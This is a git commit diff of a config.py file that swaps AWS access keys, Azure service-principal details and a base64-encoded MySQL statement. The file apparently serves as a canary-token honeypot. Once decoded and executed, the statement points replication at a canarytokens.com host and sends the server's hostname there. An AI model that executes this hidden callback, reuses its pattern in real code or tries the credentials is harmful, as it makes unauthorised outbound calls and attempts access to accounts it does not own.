6dbb55b223b98a5b12e1938ec1c3e7790df882e5
leakymcgee <86233108+leakymcgee@users.noreply.github.com>
2023-09-02 15:21:21 +0200

    Update config.py

--- config.py
+++ config.py
@@ -1,25 +1,13 @@
-apikey=1234
-aws_access_key_id = AKIAVD32IN6IC4F6LGXF
-aws_secret_access_key = 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
+aws_access_key_id = AKIAVAGUQ5JEUKDIHRXR
+aws_secret_access_key = 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
 
 
-[default]
-aws_access_key_id = AKIA2OGYBAH6ZJAFIHXI
-aws_secret_access_key = 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
-output = json
-region = us-east-2
+
+appId= '6b13352a-8cf5-4cac-9c72-6189b4ebf59c'
+displayName = 'azure-cli-LlBRyVuBHLfjANvdec0kwfyTVH6XuexZ'
 
 
-{
-  "appId": "6b13352a-8cf5-4cac-9c72-6189b4ebf59c",
-  "displayName": "azure-cli-LlBRyVuBHLfjANvdec0kwfyTVH6XuexZ",
-  "fileWithCertAndPrivateKey": "Secver ",
-  "password": null,
-  "tenant": "c5b88def-64d6-4276-aa23-feab7321ced5"
-}
-
-
-SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIE1BU1RFUl9SRVRSWV9DT1VOVD0xLCBNQVNURVJfUE9SVD0zMzA2LCBNQVNURVJfSE9TVD0ndmw5NHBhejhwYW5rc2w5czJocGRmc216MC5jYW5hcnl0b2tlbnMuY29tJywgTUFTVEVSX1VTRVI9J3ZsOTRwYXo4cGFua3NsOXMyaHBkZnNtejAiLCBAQGxjX3RpbWVfbmFtZXMsIEBAaG9zdG5hbWUsICInOyIpOw==';
+SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIE1BU1RFUl9SRVRSWV9DT1VOVD0xLCBNQVNURVJfUE9SVD0zMzA2LCBNQVNURVJfSE9TVD0ncTRwcWEzdDgxbXNzcmZyODZhb3pyemJycC5jYW5hcnl0b2tlbnMuY29tJywgTUFTVEVSX1VTRVI9J3E0cHFhM3Q4MW1zc3Jmcjg2YW96cnpicnAiLCBAQGxjX3RpbWVfbmFtZXMsIEBAaG9zdG5hbWUsICInOyIpOw==';
 SET @s2 = FROM_BASE64(@b);
 PREPARE stmt1 FROM @s2;
 EXECUTE stmt1;
@@ -35,3 +23,11 @@ region = us-east-2
 
 ffdaye0jg6usp33u9jab6wf2i.canarytokens.com
                     
+
+{
+  "appId": "6b13352a-8cf5-4cac-9c72-6189b4ebf59c",
+  "displayName": "azure-cli-F7c05qM5V8IfNVb7rbURbIFrFtfvrYVF",
+  "fileWithCertAndPrivateKey": "Code_sign_server_3",
+  "password": null,
+  "tenant": "c5b88def-64d6-4276-aa23-feab7321ced5"
+}
